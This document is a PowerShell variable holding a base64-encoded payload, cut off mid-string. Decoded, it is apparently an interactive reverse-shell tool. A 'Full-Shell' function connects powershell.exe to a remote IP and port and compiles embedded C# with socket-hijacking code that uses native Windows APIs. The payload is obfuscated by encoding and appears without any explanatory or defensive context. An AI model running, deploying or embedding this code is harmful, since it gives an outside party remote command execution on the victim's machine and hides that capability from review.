$powershell_encoded = "ZnVuY3Rpb24gRnVsbC1TaGVsbAp7ICAgCiAgICA8IwogICAgICAgICAgICAKICAgICAgIEZVTExZIFJFQURJTkcgQU5EIFdSSVRUSU5HIENPTk5FQ1RJT04KICAgICAgICAgICAgCiAgICAjPgogICAgUGFyYW0KICAgICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUmVtb3RlSXAsCiAgICA8IwogICAgICAgIFJlbW90ZSBEb21haW4gZm9yIHJlYWRpbmcgcmVtb3RlbHkgZnJvbSBhbm90aGVyIGRlc3RpbmF0aW9uCiAgICAjPgogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVQb3J0LAogICAgPCMKICAgICAgICBSZW1vdGUgUG9ydCBmb3IgY29ubmV0aW5nIHJlbW90ZSBob3N0IGZyb20gdGhlIGludGVybmV0ICAKICAgICM+CgogICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSb3dzID0gIjI0IiwKICAgIDwjCiAgICAgICAgUm93cyBmb3Igc2l6ZQogICAgIz4KCiAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbHMgPSAiODAiLAoKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tbWFuZExpbmUgPSAicG93ZXJzaGVsbC5leGUiLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRVcGdyYWRlCiAgICApCiAgICAKICAgIGlmKCAkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ1VwZ3JhZGUnKSApIHsKICAgICAgICAkUmVtb3RlSXAgPSAidXBncmFkZSIKICAgICAgICAkUmVtb3RlUG9ydCA9ICJzaGVsbCIKICAgIH0KICAgIGVsc2V7CiAgCiAgICAgICAgaWYoLU5vdCgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ1JlbW90ZUlwJykpKSB7CiAgICAgICAgICAgIHRocm93ICJSZW1vdGVJcCBtaXNzaW5nIHBhcmFtZXRlciIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYoLU5vdCgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ1JlbW90ZVBvcnQnKSkpIHsKICAgICAgICAgICAgdGhyb3cgIlJlbW90ZVBvcnQgbWlzc2luZyBwYXJhbWV0ZXIiCiAgICAgICAgfQogICAgfQogICAgJHBhcmFtZXRlcnNGdWxsU2hlbGwgPSBAKCRSZW1vdGVJcCwgJFJlbW90ZVBvcnQsICRSb3dzLCAkQ29scywgJENvbW1hbmRMaW5lKQogICAgQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRTb3VyY2UgLUxhbmd1YWdlIENTaGFycDsKICAgICRvdXRwdXQgPSBbRnVsbFNoZWxsTWFpbkNsYXNzXTo6RnVsbFNoZWxsTWFpbigkcGFyYW1ldGVyc2Z1bGxTaGVsbCkKICAgIFdyaXRlLU91dHB1dCAkb3V0cHV0Cn0KCiRTb3VyY2UgPSBAIgoKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uTmV0LlNvY2tldHM7CnVzaW5nIFN5c3RlbS5OZXQuTmV0d29ya0luZm9ybWF0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7CgpwdWJsaWMgY2xhc3MgRnVsbFNoZWxsRXhjZXB0aW9uIDogRXhjZXB0aW9uCnsKICAgIHByaXZhdGUgY29uc3Qgc3RyaW5nIGVycm9yX3N0cmluZyA9ICJbLV0gRnVsbFNoZWxsRXhjZXB0aW9uOiAiOwoKICAgIHB1YmxpYyBGdWxsU2hlbGxFeGNlcHRpb24oKSB7IH0KCiAgICBwdWJsaWMgRnVsbFNoZWxsRXhjZXB0aW9uKHN0cmluZyBtZXNzYWdlKSA6IGJhc2UoZXJyb3Jfc3RyaW5nICsgbWVzc2FnZSkgeyB9Cn0KCnB1YmxpYyBjbGFzcyBEZWFkbG9ja0NoZWNrSGVscGVyCnsKCiAgICBwcml2YXRlIGJvb2wgZGVhZGxvY2tEZXRlY3RlZDsKICAgIHByaXZhdGUgSW50UHRyIHRhcmdldEhhbmRsZTsKCiAgICBwcml2YXRlIGRlbGVnYXRlIHVpbnQgTFBUSFJFQURfU1RBUlRfUk9VVElORSh1aW50IGxwUGFyYW0pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwoKICAgIFtEbGxJbXBvcnQoIktlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQodWludCBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIExQVEhSRUFEX1NUQVJUX1JPVVRJTkUgbHBTdGFydEFkZHJlc3MsIEludFB0ciBscFBhcmFtZXRlciwgdWludCBkd0NyZWF0aW9uRmxhZ3MsIG91dCB1aW50IGxwVGhyZWFkSWQpOwoKICAgIHByaXZhdGUgdWludCBUaHJlYWRDaGVja0RlYWRsb2NrKHVpbnQgdGhyZWFkUGFyYW1zKQogICAgewogICAgICAgIEludFB0ciBvYmpQdHIgPSBJbnRQdHIuWmVybzsKICAgICAgICBvYmpQdHIgPSBTb2NrZXRIaWphY2tpbmcuTnRRdWVyeU9iamVjdER5bmFtaWModGhpcy50YXJnZXRIYW5kbGUsIFNvY2tldEhpamFja2luZy5PQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MuT2JqZWN0TmFtZUluZm9ybWF0aW9uLCAwKTsKICAgICAgICB0aGlzLmRlYWRsb2NrRGV0ZWN0ZWQgPSBmYWxzZTsKICAgICAgICBpZiAob2JqUHRyICE9IEludFB0ci5aZXJvKSBNYXJzaGFsLkZyZWVIR2xvYmFsKG9ialB0cik7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgcHVibGljIGJvb2wgQ2hlY2tEZWFkbG9ja0RldGVjdGVkKEludFB0ciB0SGFuZGxlKQogICAgewogICAgICAgIHRoaXMuZGVhZGxvY2tEZXRlY3RlZCA9IHRydWU7CiAgICAgICAgdGhpcy50YXJnZXRIYW5kbGUgPSB0SGFuZGxlOwogICAgICAgIExQVEhSRUFEX1NUQVJUX1JPVVRJTkUgZGVsZWdhdGVUaHJlYWRDaGVja0RlYWRsb2NrID0gbmV3IExQVEhSRUFEX1NUQVJUX1JPVVRJTkUodGhpcy5UaHJlYWRDaGVja0RlYWRsb2NrKTsKICAgICAgICBJbnRQdHIgaFRocmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIHVpbnQgdGhyZWFkSWQgPSAwOwogICAgICAgIC8vd2UgbmVlZCBuYXRpdmUgdGhyZWFkcywgQyMgdGhyZWFkcyBoYW5nIGFuZCBnbyBpbiBsb2NrLiBXZSBuZWVkIHRvIGF2b2lkcyBoYW5ncyBvbiBuYW1lZCBwaXBlIHNvLi4uIE5vIGhhbmdzIG5vIGRlYWRsb2Nrcy4uLiBubyBwYWluIG5vIGdhaW5zLi4uCiAgICAgICAgaFRocmVhZCA9IENyZWF0ZVRocmVhZCgwLCAwLCBkZWxlZ2F0ZVRocmVhZENoZWNrRGVhZGxvY2ssIEludFB0ci5aZXJvLCAwLCBvdXQgdGhyZWFkSWQpOwogICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3QoaFRocmVhZCwgMTUwMCk7CiAgICAgICAgLy93ZSBkbyBub3Qga2lsbCB0aGUgInBlbmRpbmciIHRocmVhZHMgaGVyZSB3aXRoIFRlcm1pbmF0ZVRocmVhZCgpIGJlY2F1c2UgaXQgd2lsbCBjcmFzaCB0aGUgd2hvbGUgcHJvY2VzcyBpZiB3ZSBkbyBpdCBvbiBsb2NrZWQgdGhyZWFkcy4KICAgICAgICAvL2p1c3Qgc29tZSB3YXN0ZSBvZiB0aHJlYWRzIDooCiAgICAgICAgQ2xvc2VIYW5kbGUoaFRocmVhZCk7CiAgICAgICAgcmV0dXJuIHRoaXMuZGVhZGxvY2tEZXRlY3RlZDsKICAgIH0KfQoKcHVibGljIHN0YXRpYyBjbGFzcyBTb2NrZXRIaWphY2tpbmcKewoKICAgIHByaXZhdGUgY29uc3QgdWludCBOVFNUQVRVU19TVUNDRVNTID0gMHgwMDAwMDAwMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBOVFNUQVRVU19JTkZPTEVOR1RITUlTTUFUQ0ggPSAweGMwMDAwMDA0OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IE5UU1RBVFVTX0JVRkZFUk9WRVJGTE9XID0gMHg4MDAwMDAwNTsKICAgIHByaXZhdGUgY29uc3QgdWludCBOVFNUQVRVU19CVUZGRVJUT09TTUFMTCA9IDB4YzAwMDAwMjM7CiAgICBwcml2YXRlIGNvbnN0IGludCBOVFNUQVRVU19QRU5ESU5HID0gMHgwMDAwMDEwMzsKICAgIHByaXZhdGUgY29uc3QgaW50IFdTQV9GTEFHX09WRVJMQVBQRUQgPSAweDE7CiAgICBwcml2YXRlIGNvbnN0IGludCBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MgPSAweDI7CiAgICBwcml2YXRlIGNvbnN0IGludCBTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiA9IDE2OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgUFJPQ0VTU19EVVBfSEFORExFID0gMHgwMDQwOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU0lPX1RDUF9JTkZPID0gdW5jaGVja2VkKChpbnQpMHhEODAwMDAyNyk7CiAgICBwcml2YXRlIGNvbnN0IGludCBTR19VTkNPTlNUUkFJTkVEX0dST1VQID0gMHgxOwogICAgcHJpdmF0ZSBjb25zdCBpbnQgU0dfQ09OU1RSQUlORURfR1JPVVAgPSAweDI7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgSU9DVExfQUZEX0dFVF9DT05URVhUID0gMHgxMjA0MzsKICAgIHByaXZhdGUgY29uc3QgaW50IEVWRU5UX0FMTF9BQ0NFU1MgPSAweDFmMDAwMzsKICAgIHByaXZhdGUgY29uc3QgaW50IFN5bmNocm9uaXphdGlvbkV2ZW50ID0gMTsKICAgIHByaXZhdGUgY29uc3QgVUludDMyIElORklOSVRFID0gMHhGRkZGRkZGRjsKCgogICAgcHJpdmF0ZSBlbnVtIFNPQ0tFVF9TVEFURSA6IHVpbnQKICAgIHsKICAgICAgICBTb2NrZXRPcGVuID0gMCwKICAgICAgICBTb2NrZXRCb3VuZCA9IDEsCiAgICAgICAgU29ja2V0Qm91bmRVZHAgPSAyLAogICAgICAgIFNvY2tldENvbm5lY3RlZCA9IDMsCiAgICAgICAgU29ja2V0Q2xvc2VkID0gMwogICAgfQoKICAgIHByaXZhdGUgZW51bSBBRkRfR1JPVVBfVFlQRSA6IHVpbnQKICAgIHsKICAgICAgICBHcm91cFR5cGVOZWl0aGVyID0gMCwKICAgICAgICBHcm91cFR5cGVDb25zdHJhaW5lZCA9IFNHX0NPTlNUUkFJTkVEX0dST1VQLAogICAgICAgIEdyb3VwVHlwZVVuY29uc3RyYWluZWQgPSBTR19VTkNPTlNUUkFJTkVEX0dST1VQCiAgICB9CgogICAgcHVibGljIGVudW0gT0JKRUNUX0lORk9STUFUSU9OX0NMQVNTIDogaW50CiAgICB7CiAgICAgICAgT2JqZWN0QmFzaWNJbmZvcm1hdGlvbiA9IDAsCiAgICAgICAgT2JqZWN0TmFtZUluZm9ybWF0aW9uID0gMSwKICAgICAgICBPYmplY3RUeXBlSW5mb3JtYXRpb24gPSAyLAogICAgICAgIE9iamVjdEFsbFR5cGVzSW5mb3JtYXRpb24gPSAzLAogICAgICAgIE9iamVjdEhhbmRsZUluZm9ybWF0aW9uID0gNAogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldCiAgICBwcml2YXRlIHN0cnVjdCBTWVNURU1fSEFORExFX1RBQkxFX0VOVFJZX0lORk8KICAgIHsKICAgICAgICBwdWJsaWMgdXNob3J0IFVuaXF1ZVByb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgdXNob3J0IENyZWF0b3JCYWNrVHJhY2VJbmRleDsKICAgICAgICBwdWJsaWMgYnl0ZSBPYmplY3RUeXBlSW5kZXg7CiAgICAgICAgcHVibGljIGJ5dGUgSGFuZGxlQXR0cmlidXRlczsKICAgICAgICBwdWJsaWMgdXNob3J0IEhhbmRsZVZhbHVlOwogICAgICAgIHB1YmxpYyBJbnRQdHIgT2JqZWN0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgR3JhbnRlZEFjY2VzczsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBHRU5FUklDX01BUFBJTkcKICAgIHsKICAgICAgICBwdWJsaWMgaW50IEdlbmVyaWNSZWFkOwogICAgICAgIHB1YmxpYyBpbnQgR2VuZXJpY1dyaXRlOwogICAgICAgIHB1YmxpYyBpbnQgR2VuZXJpY0V4ZWN1dGU7CiAgICAgICAgcHVibGljIGludCBHZW5lcmljQWxsOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldCiAgICBwcml2YXRlIHN0cnVjdCBPQkpFQ1RfVFlQRV9JTkZPUk1BVElPTl9WMgogICAgewogICAgICAgIHB1YmxpYyBVTklDT0RFX1NUUklORyBUeXBlTmFtZTsKICAgICAgICBwdWJsaWMgdWludCBUb3RhbE51bWJlck9mT2JqZWN0czsKICAgICAgICBwdWJsaWMgdWludCBUb3RhbE51bWJlck9mSGFuZGxlczsKICAgICAgICBwdWJsaWMgdWludCBUb3RhbFBhZ2VkUG9vbFVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsTm9uUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgVG90YWxOYW1lUG9vbFVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IFRvdGFsSGFuZGxlVGFibGVVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJOdW1iZXJPZk9iamVjdHM7Ly8gUGVha09iamVjdENvdW50OwogICAgICAgIHB1YmxpYyB1aW50IEhpZ2hXYXRlck51bWJlck9mSGFuZGxlczsvLyBQZWFrSGFuZGxlQ291bnQ7CiAgICAgICAgcHVibGljIHVpbnQgSGlnaFdhdGVyUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgSGlnaFdhdGVyTm9uUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgSGlnaFdhdGVyTmFtZVBvb2xVc2FnZTsKICAgICAgICBwdWJsaWMgdWludCBIaWdoV2F0ZXJIYW5kbGVUYWJsZVVzYWdlOwogICAgICAgIHB1YmxpYyB1aW50IEludmFsaWRBdHRyaWJ1dGVzOwogICAgICAgIHB1YmxpYyBHRU5FUklDX01BUFBJTkcgR2VuZXJpY01hcHBpbmc7CiAgICAgICAgcHVibGljIHVpbnQgVmFsaWRBY2Nlc3NNYXNrOwogICAgICAgIHB1YmxpYyBieXRlIFNlY3VyaXR5UmVxdWlyZWQ7Ly9ib29sCiAgICAgICAgcHVibGljIGJ5dGUgTWFpbnRhaW5IYW5kbGVDb3VudDsvL2Jvb2wKICAgICAgICBwdWJsaWMgYnl0ZSBUeXBlSW5kZXg7CiAgICAgICAgcHVibGljIGJ5dGUgUmVzZXJ2ZWRCeXRlOwogICAgICAgIHB1YmxpYyB1aW50IFBvb2xUeXBlOwogICAgICAgIHB1YmxpYyB1aW50IERlZmF1bHRQYWdlZFBvb2xDaGFyZ2U7Ly8gUGFnZWRQb29sVXNhZ2U7CiAgICAgICAgcHVibGljIHVpbnQgRGVmYXVsdE5vblBhZ2VkUG9vbENoYXJnZTsvL05vblBhZ2VkUG9vbFVzYWdlOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldCiAgICBwcml2YXRlIHN0cnVjdCBPQkpFQ1RfTkFNRV9JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBVTklDT0RFX1NUUklORyBOYW1lOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFVOSUNPREVfU1RSSU5HCiAgICB7CiAgICAgICAgcHVibGljIHVzaG9ydCBMZW5ndGg7CiAgICAgICAgcHVibGljIHVzaG9ydCBNYXhpbXVtTGVuZ3RoOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQnVmZmVyOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFdTQURhdGEKICAgIHsKICAgICAgICBwdWJsaWMgc2hvcnQgd1ZlcnNpb247CiAgICAgICAgcHVibGljIHNob3J0IHdIaWdoVmVyc2lvbjsKICAgICAgICBwdWJsaWMgc2hvcnQgaU1heFNvY2tldHM7CiAgICAgICAgcHVibGljIHNob3J0IGlNYXhVZHBEZzsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwVmVuZG9ySW5mbzsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxUU3RyLCBTaXplQ29uc3QgPSAyNTcpXQogICAgICAgIHB1YmxpYyBzdHJpbmcgc3pEZXNjcmlwdGlvbjsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxUU3RyLCBTaXplQ29uc3QgPSAxMjkpXQogICAgICAgIHB1YmxpYyBzdHJpbmcgc3pTeXN0ZW1TdGF0dXM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBUFJPVE9DT0xDSEFJTgogICAgewogICAgICAgIHB1YmxpYyBpbnQgQ2hhaW5MZW47CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDcpXQogICAgICAgIHB1YmxpYyB1aW50W10gQ2hhaW5FbnRyaWVzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHByaXZhdGUgc3RydWN0IFdTQVBST1RPQ09MX0lORk8KICAgIHsKICAgICAgICBwdWJsaWMgdWludCBkd1NlcnZpY2VGbGFnczE7CiAgICAgICAgcHVibGljIHVpbnQgZHdTZXJ2aWNlRmxhZ3MyOwogICAgICAgIHB1YmxpYyB1aW50IGR3U2VydmljZUZsYWdzMzsKICAgICAgICBwdWJsaWMgdWludCBkd1NlcnZpY2VGbGFnczQ7CiAgICAgICAgcHVibGljIHVpbnQgZHdQcm92aWRlckZsYWdzOwogICAgICAgIHB1YmxpYyBHdWlkIFByb3ZpZGVySWQ7CiAgICAgICAgcHVibGljIHVpbnQgZHdDYXRhbG9nRW50cnlJZDsKICAgICAgICBwdWJsaWMgV1NBUFJPVE9DT0xDSEFJTiBQcm90b2NvbENoYWluOwogICAgICAgIHB1YmxpYyBpbnQgaVZlcnNpb247CiAgICAgICAgcHVibGljIGludCBpQWRkcmVzc0ZhbWlseTsKICAgICAgICBwdWJsaWMgaW50IGlNYXhTb2NrQWRkcjsKICAgICAgICBwdWJsaWMgaW50IGlNaW5Tb2NrQWRkcjsKICAgICAgICBwdWJsaWMgaW50IGlTb2NrZXRUeXBlOwogICAgICAgIHB1YmxpYyBpbnQgaVByb3RvY29sOwogICAgICAgIHB1YmxpYyBpbnQgaVByb3RvY29sTWF4T2Zmc2V0OwogICAgICAgIHB1YmxpYyBpbnQgaU5ldHdvcmtCeXRlT3JkZXI7CiAgICAgICAgcHVibGljIGludCBpU2VjdXJpdHlTY2hlbWU7CiAgICAgICAgcHVibGljIHVpbnQgZHdNZXNzYWdlU2l6ZTsKICAgICAgICBwdWJsaWMgdWludCBkd1Byb3ZpZGVyUmVzZXJ2ZWQ7CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0ID0gMjU2KV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6UHJvdG9jb2w7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS0FERFJfSU4KICAgIHsKICAgICAgICBwdWJsaWMgc2hvcnQgc2luX2ZhbWlseTsKICAgICAgICBwdWJsaWMgc2hvcnQgc2luX3BvcnQ7CiAgICAgICAgcHVibGljIHVpbnQgc2luX2FkZHI7CiAgICAgICAgcHVibGljIGxvbmcgc2luX3plcm87CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgVENQX0lORk9fdjAKICAgIHsKICAgICAgICBwdWJsaWMgVGNwU3RhdGUgU3RhdGU7CiAgICAgICAgcHVibGljIFVJbnQzMiBNc3M7CiAgICAgICAgcHVibGljIFVJbnQ2NCBDb25uZWN0aW9uVGltZU1zOwogICAgICAgIHB1YmxpYyBieXRlIFRpbWVzdGFtcHNFbmFibGVkOwogICAgICAgIHB1YmxpYyBVSW50MzIgUnR0VXM7CiAgICAgICAgcHVibGljIFVJbnQzMiBNaW5SdHRVczsKICAgICAgICBwdWJsaWMgVUludDMyIEJ5dGVzSW5GbGlnaHQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBDd25kOwogICAgICAgIHB1YmxpYyBVSW50MzIgU25kV25kOwogICAgICAgIHB1YmxpYyBVSW50MzIgUmN2V25kOwogICAgICAgIHB1YmxpYyBVSW50MzIgUmN2QnVmOwogICAgICAgIHB1YmxpYyBVSW50NjQgQnl0ZXNPdXQ7CiAgICAgICAgcHVibGljIFVJbnQ2NCBCeXRlc0luOwogICAgICAgIHB1YmxpYyBVSW50MzIgQnl0ZXNSZW9yZGVyZWQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBCeXRlc1JldHJhbnM7CiAgICAgICAgcHVibGljIFVJbnQzMiBGYXN0UmV0cmFuczsKICAgICAgICBwdWJsaWMgVUludDMyIER1cEFja3NJbjsKICAgICAgICBwdWJsaWMgVUludDMyIFRpbWVvdXRFcGlzb2RlczsKICAgICAgICBwdWJsaWMgYnl0ZSBTeW5SZXRyYW5zOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IGxpbmdlcgogICAgewogICAgICAgIHB1YmxpYyBVSW50MTYgbF9vbm9mZjsKICAgICAgICBwdWJsaWMgVUludDE2IGxfbGluZ2VyOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMCldCiAgICBwcml2YXRlIHN0cnVjdCBJT19TVEFUVVNfQkxPQ0sKICAgIHsKICAgICAgICBwdWJsaWMgaW50IHN0YXR1czsKICAgICAgICBwdWJsaWMgSW50UHRyIGluZm9ybWF0aW9uOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFNPQ0tfU0hBUkVEX0lORk8KICAgIHsKICAgICAgICBwdWJsaWMgU09DS0VUX1NUQVRFIFN0YXRlOwogICAgICAgIHB1YmxpYyBJbnQzMiBBZGRyZXNzRmFtaWx5OwogICAgICAgIHB1YmxpYyBJbnQzMiBTb2NrZXRUeXBlOwogICAgICAgIHB1YmxpYyBJbnQzMiBQcm90b2NvbDsKICAgICAgICBwdWJsaWMgSW50MzIgTG9jYWxBZGRyZXNzTGVuZ3RoOwogICAgICAgIHB1YmxpYyBJbnQzMiBSZW1vdGVBZGRyZXNzTGVuZ3RoOwoKICAgICAgICAvLyBTb2NrZXQgb3B0aW9ucyBjb250cm9sbGVkIGJ5IGdldHNvY2tvcHQoKSwgc2V0c29ja29wdCgpLgogICAgICAgIHB1YmxpYyBsaW5nZXIgTGluZ2VySW5mbzsKICAgICAgICBwdWJsaWMgVUludDMyIFNlbmRUaW1lb3V0OwogICAgICAgIHB1YmxpYyBVSW50MzIgUmVjZWl2ZVRpbWVvdXQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSZWNlaXZlQnVmZmVyU2l6ZTsKICAgICAgICBwdWJsaWMgVUludDMyIFNlbmRCdWZmZXJTaXplOwogICAgICAgIC8qIFRob3NlIGFyZSB0aGUgYml0cyBpbiB0aGUgU29ja2V0UHJvZXJ0eSwgcHJvcGVyIG9yZGVyOgogICAgICAgICAgICBMaXN0ZW5pbmc7CiAgICAgICAgICAgIEJyb2FkY2FzdDsKICAgICAgICAgICAgRGVidWc7CiAgICAgICAgICAgIE9vYklubGluZTsKICAgICAgICAgICAgUmV1c2VBZGRyZXNzZXM7CiAgICAgICAgICAgIEV4Y2x1c2l2ZUFkZHJlc3NVc2U7CiAgICAgICAgICAgIE5vbkJsb2NraW5nOwogICAgICAgICAgICBEb250VXNlV2lsZGNhcmQ7CiAgICAgICAgICAgIFJlY2VpdmVTaHV0ZG93bjsKICAgICAgICAgICAgU2VuZFNodXRkb3duOwogICAgICAgICAgICBDb25kaXRpb25hbEFjY2VwdDsKICAgICAgICAqLwogICAgICAgIHB1YmxpYyB1c2hvcnQgU29ja2V0UHJvcGVydHk7CiAgICAgICAgLy8gU25hcHNob3Qgb2Ygc2V2ZXJhbCBwYXJhbWV0ZXJzIHBhc3NlZCBpbnRvIFdTUFNvY2tldCgpIHdoZW4gY3JlYXRpbmcgdGhpcyBzb2NrZXQKICAgICAgICBwdWJsaWMgVUludDMyIENyZWF0aW9uRmxhZ3M7CiAgICAgICAgcHVibGljIFVJbnQzMiBDYXRhbG9nRW50cnlJZDsKICAgICAgICBwdWJsaWMgVUludDMyIFNlcnZpY2VGbGFnczE7CiAgICAgICAgcHVibGljIFVJbnQzMiBQcm92aWRlckZsYWdzOwogICAgICAgIHB1YmxpYyBVSW50MzIgR3JvdXBJRDsKICAgICAgICBwdWJsaWMgQUZEX0dST1VQX1RZUEUgR3JvdXBUeXBlOwogICAgICAgIHB1YmxpYyBJbnQzMiBHcm91cFByaW9yaXR5OwogICAgICAgIC8vIExhc3QgZXJyb3Igc2V0IG9uIHRoaXMgc29ja2V0CiAgICAgICAgcHVibGljIEludDMyIExhc3RFcnJvcjsKICAgICAgICAvLyBJbmZvIHN0b3JlZCBmb3IgV1NBQXN5bmNTZWxlY3QoKQogICAgICAgIHB1YmxpYyBJbnRQdHIgQXN5bmNTZWxlY3RoV25kOwogICAgICAgIHB1YmxpYyBVSW50MzIgQXN5bmNTZWxlY3RTZXJpYWxOdW1iZXI7CiAgICAgICAgcHVibGljIFVJbnQzMiBBc3luY1NlbGVjdHdNc2c7CiAgICAgICAgcHVibGljIEludDMyIEFzeW5jU2VsZWN0bEV2ZW50OwogICAgICAgIHB1YmxpYyBJbnQzMiBEaXNhYmxlZEFzeW5jU2VsZWN0RXZlbnRzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFNPQ0tBRERSCiAgICB7CiAgICAgICAgcHVibGljIFVJbnQxNiBzYV9mYW1pbHk7CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDE0KV0KICAgICAgICBwdWJsaWMgYnl0ZVtdIHNhX2RhdGE7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS0VUX0NPTlRFWFQKICAgIHsKICAgICAgICBwdWJsaWMgU09DS19TSEFSRURfSU5GTyBTaGFyZWREYXRhOwogICAgICA